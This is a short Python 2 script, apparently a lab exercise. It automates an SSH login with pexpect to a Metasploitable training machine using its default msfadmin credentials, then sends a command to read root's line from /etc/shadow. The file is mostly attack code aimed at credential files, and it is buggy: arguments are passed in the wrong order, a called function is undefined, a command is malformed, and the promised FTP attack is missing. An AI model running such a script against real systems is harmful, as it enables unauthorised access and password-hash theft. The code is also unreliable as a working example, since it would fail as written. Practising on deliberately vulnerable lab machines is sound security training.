#!/usr/bin/python

import pexpect

#Author: Daniel Edwards
#Description: SSH & FTP attacks against metasploitable machine

PROMPT = ['# ', '>>>', '>', '\\$']

def connect(user,host,password):
	ssh_newkey = 'Are you sure you want to continue connecting?'
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])

	if ret == 0:
		print '[-] Error Connecting'
		return

	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])

		if ret == 0:
			print '[-] Error connecting'
			return

	child.sendline(password)
	child.expect(PROMPT)
	return child


def main():
	
	host =""
	user = "msfadmin"
	password = "msfadmin"
	child = connect(host,user,password)
	send_command(child, 'cat/etc/shadow | grep root;ps')




